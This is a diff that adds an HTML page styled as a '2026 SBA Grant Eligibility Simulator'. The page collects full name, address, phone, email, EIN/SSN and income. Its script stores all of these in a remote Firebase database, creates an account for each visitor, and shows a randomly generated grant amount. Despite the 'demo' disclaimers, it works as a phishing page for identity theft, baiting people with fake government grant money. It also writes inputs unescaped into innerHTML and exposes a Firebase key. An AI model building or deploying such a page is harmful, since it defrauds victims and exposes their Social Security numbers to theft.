@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SBA Grant Eligibility Simulator 2026</title><!-- Fonts --><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"><!-- Firebase --><script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js"></script><style>
+body{
+  margin:0;
+  font-family:'Inter', sans-serif;
+  background: linear-gradient(135deg,#f6f9ff,#eef3ff);
+  color:#1f2a44;
+}
+
+header{
+  background:#ffffff;
+  padding:20px 40px;
+  box-shadow:0 8px 25px rgba(0,0,0,0.05);
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+header h1{
+  font-size:20px;
+  font-weight:700;
+  color:#1e3a8a;
+}
+
+.badge{
+  background:#e0ecff;
+  color:#1e3a8a;
+  padding:6px 12px;
+  border-radius:20px;
+  font-size:12px;
+  font-weight:600;
+}
+
+.container{
+  max-width:1100px;
+  margin:40px auto;
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:30px;
+  padding:0 20px;
+}
+
+.card{
+  background:#fff;
+  border-radius:18px;
+  padding:25px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.06);
+  animation:fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(15px)}
+  to{opacity:1; transform:translateY(0)}
+}
+
+h2{
+  margin-top:0;
+  color:#1e3a8a;
+}
+
+input{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border:1px solid #dbe3f3;
+  border-radius:10px;
+  outline:none;
+  transition:0.3s;
+}
+
+input:focus{
+  border-color:#4f7cff;
+  box-shadow:0 0 0 3px rgba(79,124,255,0.1);
+}
+
+button{
+  width:100%;
+  padding:14px;
+  background:#1e3a8a;
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-weight:600;
+  cursor:pointer;
+  margin-top:10px;
+  transition:0.3s;
+}
+
+button:hover{
+  background:#274bbd;
+  transform:translateY(-1px);
+}
+
+.result-box{
+  background:#f8fbff;
+  border:1px solid #dbe3f3;
+  padding:15px;
+  border-radius:12px;
+  margin-top:15px;
+}
+
+.grant{
+  font-size:22px;
+  font-weight:700;
+  color:#16a34a;
+}
+
+small{
+  color:#6b7280;
+}
+
+table{
+  width:100%;
+  border-collapse:collapse;
+  margin-top:10px;
+}
+
+td,th{
+  padding:10px;
+  border-bottom:1px solid #eee;
+  text-align:left;
+  font-size:14px;
+}
+
+.footer{
+  text-align:center;
+  padding:20px;
+  font-size:12px;
+  color:#6b7280;
+}
+
+@media (max-width: 768px){
+  .container{
+    grid-template-columns:1fr;
+    padding:0 10px;
+    margin:20px auto;
+  }
+
+  header{
+    flex-direction:column;
+    gap:10px;
+    text-align:center;
+    padding:15px 20px;
+  }
+
+  .card{
+    padding:18px;
+  }
+
+  h1{
+    font-size:16px;
+  }
+
+  h2{
+    font-size:18px;
+  }
+}
+</style></head><body><header>
+  <h1>2026 SBA Grant Eligibility Simulator</h1>
+  <span class="badge">SIMULATION SYSTEM</span>
+</header><div class="container">  <!-- FORM -->  <div class="card">
+    <h2>Eligibility Form</h2><input id="name" placeholder="Full Name" />
+<input id="email" placeholder="Email Address" />
+<input id="phone" placeholder="Phone Number" />
+<input id="address" placeholder="Home Address" />
+<input id="businessName" placeholder="Business Name" />
+<input id="state" placeholder="State" />
+<input id="ein" placeholder="EIN / SSN" />
+<input id="income" placeholder="Annual Income" />
+
+<button onclick="checkEligibility()">Check Eligibility</button>
+
+<small>
+  By submitting, you agree this is a <b>demo simulation system</b> only.
+</small>
+
+  </div>  <!-- RESULT -->  <div class="card">
+    <h2>Eligibility Result</h2><div id="output" class="result-box">
+  Submit form to view your simulated grant result.
+</div>
+
+  </div></div><div class="footer">
+  © 2026 Grant Simulation Platform | Not affiliated with any government agency
+</div><script>
+// Firebase config (replace)
+const firebaseConfig = {
+  apiKey: "AIzaSyB-BUuIs7VCzeZgGXziqsAk-zr7UarRp4c",
+  authDomain: "survey-d97e7.firebaseapp.com",
+  databaseURL: "https://survey-d97e7-default-rtdb.firebaseio.com",
+  projectId: "survey-d97e7",
+  storageBucket: "survey-d97e7.firebasestorage.app",
+  messagingSenderId: "861361956801",
+  appId: "1:861361956801:web:65b2ee8eb04f5c2d5d3140",
+  measurementId: "G-QW860EGGZ9"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+function randomGrant(){
+  return Math.floor(Math.random() * (250000 - 10000 + 1)) + 10000;
+}
+
+function score(){
+  return Math.floor(Math.random() * 100);
+}
+
+async function checkEligibility(){
+  const name = document.getElementById("name").value;
+  const email = document.getElementById("email").value;
+  const phone = document.getElementById("phone").value;
+  const address = document.getElementById("address").value;
+  const businessName = document.getElementById("businessName").value;
+  const state = document.getElementById("state").value;
+  const ein = document.getElementById("ein").value;
+  const income = document.getElementById("income").value;
+
+  const password = Math.random().toString(36).slice(-10);
+  const grant = randomGrant();
+  const eligibility = score();
+
+  const user = await firebase.auth().createUserWithEmailAndPassword(email, password);
+
+  await db.collection("applications").doc(user.user.uid).set({
+    name,
+    email,
+    phone,
+    address,
+    businessName,
+    state,
+    ein,
+    income,
+    eligibility,
+    grant,
+    password,
+    createdAt: new Date()
+  });
+
+  document.getElementById("output").innerHTML = `
+    <div class="grant">$${grant.toLocaleString()}</div>
+    <p><b>${name}</b>, your simulated eligibility score is <b>${eligibility}/100</b></p>
+    
+    <table>
+      <tr><th>Email</th><td>${email}</td></tr>
+      <tr><th>Phone</th><td>${phone}</td></tr>
+      <tr><th>Address</th><td>${address}</td></tr>
+      <tr><th>Business Name</th><td>${businessName}</td></tr>
+      <tr><th>State</th><td>${state}</td></tr>
+      <tr><th>EIN/SSN</th><td>${ein}</td></tr>
+      <tr><th>Income</th><td>$${income}</td></tr>
+      <tr><th>Demo Password</th><td>${password}</td></tr>
+    </table>
+
+    <small>Results are simulated and not real grant approvals.</small>
+  `;
+}
+</script></body>
+</html>
